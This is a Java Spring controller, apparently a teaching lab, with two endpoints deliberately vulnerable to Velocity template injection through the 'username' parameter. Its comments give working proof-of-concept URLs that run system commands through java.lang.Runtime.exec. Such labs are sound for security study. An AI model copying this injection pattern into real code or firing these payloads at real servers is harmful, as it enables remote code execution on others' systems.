package com.qwesec;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;
import org.apache.velocity.runtime.parser.node.SimpleNode;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.*;
import java.nio.file.Paths;

/**
 * 主要控制器，包含两个存在 Velocity 模板注入漏洞的端点。
 * 这些端点允许用户在 URL 参数中传入 Velocity 模板代码，
 * 从而可能导致远程代码执行 (RCE)。
 *
 * 作者: X1ongSec
 * 日期: 2025/2/19 01:02
 */
@Controller
public class MainController {

    /**
     * Velocity 模板注入漏洞 (evaluate 方法)
     *
     * 通过 Velocity.evaluate 解析用户输入，导致可能的远程代码执行。
     *
     * @poc (Mac): http://localhost:9090/evaluate/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
     * @poc (Windows): http://localhost:9090/evaluate/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22calc%22)
     *
     * @param username 用户名 (可被利用进行模板注入)
     * @return 解析后的模板字符串
     */
    @RequestMapping("/evaluate/vul")
    @ResponseBody
    public String evaluateVul(@RequestParam(defaultValue="x1ongsec") String username) {
        // 直接将用户输入嵌入模板字符串，存在模板注入风险
        String templateString = "Hello, " + username + " | Full name: $name, phone: $phone, email: $email";

        // 初始化 Velocity
        Velocity.init();

        // 创建 Velocity 上下文并填充变量
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "x1ong x1ong x1ong");
        ctx.put("phone", "012345678");
        ctx.put("email", "admin@qwesec.com");

        // 解析模板
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "test", templateString);

        return out.toString();
    }

    /**
     * Velocity 模板注入漏洞 (merge 方法)
     *
     * 读取外部 Velocity 模板文件，并替换其中的 <USERNAME> 变量，
     * 允许用户通过输入恶意 payload 来执行任意代码。
     *
     * @poc (Mac): http://localhost:9090/merge/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
     * @poc (Windows): http://localhost:9090/merge/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22calc%22)
     *
     * @param username 用户名 (可被利用进行模板注入)
     * @return 解析后的模板字符串
     */
    @RequestMapping("/merge/vul")
    @ResponseBody
    public String mergeVul(@RequestParam(defaultValue="x1ongsec") String username) throws IOException, ParseException {

        // 读取 Velocity 模板文件
        BufferedReader bufferedReader = new BufferedReader(new FileReader(
                String.valueOf(Paths.get(MainController.class.getClassLoader()
                        .getResource("templates/merge.vm")
                        .toString().replace("file:", ""))
                )
        ));

        // 将模板文件内容读取到字符串中
        StringBuilder stringBuilder = new StringBuilder();
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line);
        }

        // 替换模板中的 <USERNAME> 变量，存在注入风险
        String templateString = stringBuilder.toString();
        templateString = templateString.replace("<USERNAME>", username);

        // 创建 Velocity 解析器
        StringReader reader = new StringReader(templateString);
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "x1ong x1ong x1ong");
        ctx.put("phone", "012345678");
        ctx.put("email", "admin@qwesec.com");

        // 解析并执行 Velocity 模板
        StringWriter out = new StringWriter();
        org.apache.velocity.Template template = new org.apache.velocity.Template();
        RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
        SimpleNode node = runtimeServices.parse(reader, template);
        template.setRuntimeServices(runtimeServices);
        template.setData(node);
        template.initDocument();
        template.merge(ctx, out);

        return out.toString();
    }
}
